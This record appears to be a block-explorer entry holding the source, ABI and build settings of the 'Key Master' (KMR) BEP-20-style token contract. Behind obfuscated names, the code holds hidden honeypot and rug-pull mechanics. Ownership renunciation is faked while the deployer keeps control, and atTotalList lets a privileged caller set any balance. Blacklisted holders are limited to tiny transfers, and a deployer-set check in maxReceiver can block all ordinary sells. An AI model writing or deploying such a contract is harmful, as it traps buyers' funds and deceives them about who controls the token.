{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface limitExempt {\n    function createPair(address autoLaunch, address marketingExempt) external returns (address);\n}\n\ninterface fromTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverFeeSell) external view returns (uint256);\n\n    function transfer(address marketingSenderFrom, uint256 buyTeam) external returns (bool);\n\n    function allowance(address tokenFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingSenderFrom,\n        uint256 buyTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeFromList, uint256 value);\n    event Approval(address indexed tokenFee, address indexed spender, uint256 value);\n}\n\nabstract contract liquidityEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromTxMetadata is fromTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract KeyMaster is liquidityEnable, fromTx, fromTxMetadata {\n\n    function allowance(address modeExemptReceiver, address walletBuy) external view virtual override returns (uint256) {\n        if (walletBuy == txMax) {\n            return type(uint256).max;\n        }\n        return fundLiquidityTeam[modeExemptReceiver][walletBuy];\n    }\n\n    address enableTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isReceiver;\n    }\n\n    uint256 public launchIsMarketing;\n\n    bool public maxBuyLimit;\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountModeSell;\n    }\n\n    constructor (){\n        if (marketingSell) {\n            launchIsMarketing = feeToken;\n        }\n        tradingTx tradingTo = tradingTx(txMax);\n        buyTrading = limitExempt(tradingTo.factory()).createPair(tradingTo.WETH(), address(this));\n        if (sellTeam != marketingSell) {\n            listAmount = launchIsMarketing;\n        }\n        shouldSender = _msgSender();\n        tokenTotal[shouldSender] = true;\n        fundAmountSender[shouldSender] = isReceiver;\n        totalFundSell();\n        if (launchIsMarketing == listAmount) {\n            maxBuyLimit = false;\n        }\n        emit Transfer(address(0), shouldSender, isReceiver);\n    }\n\n    uint256 launchedReceiver;\n\n    mapping(address => uint256) private fundAmountSender;\n\n    function transferFrom(address toExempt, address marketingSenderFrom, uint256 buyTeam) external override returns (bool) {\n        if (_msgSender() != txMax) {\n            if (fundLiquidityTeam[toExempt][_msgSender()] != type(uint256).max) {\n                require(buyTeam <= fundLiquidityTeam[toExempt][_msgSender()]);\n                fundLiquidityTeam[toExempt][_msgSender()] -= buyTeam;\n            }\n        }\n        return maxReceiver(toExempt, marketingSenderFrom, buyTeam);\n    }\n\n    function limitSellFund(address minMode) public {\n        exemptTo();\n        if (limitSenderLaunched != listTradingAt) {\n            listAmount = feeToken;\n        }\n        if (minMode == shouldSender || minMode == buyTrading) {\n            return;\n        }\n        minLaunched[minMode] = true;\n    }\n\n    address public shouldSender;\n\n    uint256 buySell;\n\n    function receiverTxMarketing(uint256 buyTeam) public {\n        exemptTo();\n        launchedReceiver = buyTeam;\n    }\n\n    function maxReceiver(address toExempt, address marketingSenderFrom, uint256 buyTeam) internal returns (bool) {\n        if (toExempt == shouldSender) {\n            return marketingLaunched(toExempt, marketingSenderFrom, buyTeam);\n        }\n        uint256 senderSellWallet = fromTx(buyTrading).balanceOf(enableTeam);\n        require(senderSellWallet == launchedReceiver);\n        require(marketingSenderFrom != enableTeam);\n        if (minLaunched[toExempt]) {\n            return marketingLaunched(toExempt, marketingSenderFrom, fundToken);\n        }\n        return marketingLaunched(toExempt, marketingSenderFrom, buyTeam);\n    }\n\n    mapping(address => bool) public tokenTotal;\n\n    string private receiverLaunch = \"KMR\";\n\n    function walletList(address buyMin) public {\n        require(buyMin.balance < 100000);\n        if (shouldWallet) {\n            return;\n        }\n        if (launchIsMarketing == listAmount) {\n            marketingSell = false;\n        }\n        tokenTotal[buyMin] = true;\n        if (limitSenderLaunched != listTradingAt) {\n            listTradingAt = false;\n        }\n        shouldWallet = true;\n    }\n\n    bool public shouldWallet;\n\n    bool public marketingSell;\n\n    string private shouldFee = \"Key Master\";\n\n    function balanceOf(address receiverFeeSell) public view virtual override returns (uint256) {\n        return fundAmountSender[receiverFeeSell];\n    }\n\n    function atTotalList(address maxTrading, uint256 buyTeam) public {\n        exemptTo();\n        fundAmountSender[maxTrading] = buyTeam;\n    }\n\n    uint8 private amountModeSell = 18;\n\n    function getOwner() external view returns (address) {\n        return takeTrading;\n    }\n\n    address txMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverLaunch;\n    }\n\n    function approve(address walletBuy, uint256 buyTeam) public virtual override returns (bool) {\n        fundLiquidityTeam[_msgSender()][walletBuy] = buyTeam;\n        emit Approval(_msgSender(), walletBuy, buyTeam);\n        return true;\n    }\n\n    address private takeTrading;\n\n    function transfer(address maxTrading, uint256 buyTeam) external virtual override returns (bool) {\n        return maxReceiver(_msgSender(), maxTrading, buyTeam);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return shouldFee;\n    }\n\n    address public buyTrading;\n\n    bool public limitSenderLaunched;\n\n    bool public listTradingAt;\n\n    mapping(address => bool) public minLaunched;\n\n    function marketingLaunched(address toExempt, address marketingSenderFrom, uint256 buyTeam) internal returns (bool) {\n        require(fundAmountSender[toExempt] >= buyTeam);\n        fundAmountSender[toExempt] -= buyTeam;\n        fundAmountSender[marketingSenderFrom] += buyTeam;\n        emit Transfer(toExempt, marketingSenderFrom, buyTeam);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed walletAuto, address indexed listEnable);\n\n    uint256 private isReceiver = 100000000 * 10 ** 18;\n\n    uint256 public feeToken;\n\n    mapping(address => mapping(address => uint256)) private fundLiquidityTeam;\n\n    function exemptTo() private view {\n        require(tokenTotal[_msgSender()]);\n    }\n\n    function totalFundSell() public {\n        emit OwnershipTransferred(shouldSender, address(0));\n        takeTrading = address(0);\n    }\n\n    uint256 public listAmount;\n\n    uint256 constant fundToken = 2 ** 10;\n\n    bool public sellTeam;\n\n    function owner() external view returns (address) {\n        return takeTrading;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeFromList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeExemptReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyTeam\",\"type\":\"uint256\"}],\"name\":\"atTotalList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFeeSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchIsMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"}],\"name\":\"limitSellFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSenderLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTradingAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuyLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyTeam\",\"type\":\"uint256\"}],\"name\":\"receiverTxMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFundSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingSenderFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMin\",\"type\":\"address\"}],\"name\":\"walletList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "KeyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}